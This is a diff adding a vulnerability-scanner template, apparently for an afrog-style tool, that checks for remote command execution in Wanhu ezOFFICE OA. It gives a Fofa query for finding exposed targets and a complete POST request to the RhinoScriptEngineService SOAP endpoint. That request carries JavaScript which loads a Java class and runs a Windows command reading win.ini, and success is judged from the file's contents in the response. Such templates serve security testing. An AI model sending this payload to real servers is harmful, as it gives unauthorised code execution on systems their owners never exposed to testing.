@@ -1,0 +1,49 @@
+id: wanhu-oa-rhinoscript-engineservice-rce
+
+info:
+  name: 万户OA-RhinoScriptEngineService命令执行
+  author: zan8in
+  severity: critical
+  verified: true
+  description: |
+    Fofa: app="万户网络-ezOFFICE"
+  reference:
+    - https://github.com/zan8in/wy876-POC/blob/main/%E4%B8%87%E6%88%B7OA-RhinoScriptEngineService%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
+  tags: wanhu,rce
+  created: 2024/02/29
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: //defaultroot/services/./././RhinoScriptEngineService
+      headers:
+        Content-Type: text/xml;charset=UTF-8
+        SOAPAction: '""'
+      body: |
+        <?xml version='1.0' encoding='UTF-8'?>
+         <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:jav="http://javascript.script.sun.com">
+           <soapenv:Body>
+             <eval xmlns="http://127.0.0.1:8080/services/scriptEngine">
+               <arg0 xmlns="">
+                 <![CDATA[
+                 try {
+                 load("nashorn:Moziilla_compat.js");
+                 } catch (e) {
+                 }
+                 importPackage(Packages.java.io);
+                 importPackage(Packages.java.lang);
+                 importPackage(Packages.java.util);
+                 importPackage(Packages.java.net);
+
+                 new URLClassLoader([new File('../server').toURL()]).loadClass('Test12').getConstructor([Class.forName("java.lang.String")]).newInstance(["type C:\\Windows\\win.ini"]).toString()
+
+                 ]]>
+               </arg0>
+               <arg1 xmlns="" xsi:type="urn:SimpleScriptContext" xmlns:urn="urn:beanservice">
+               </arg1>
+             </eval>
+           </soapenv:Body>
+         </soapenv:Envelope>
+    expression: response.status == 200 && response.body.bcontains(b'soapenv:Envelope') && response.body.bcontains(b'bit app support')
+expression: r0()
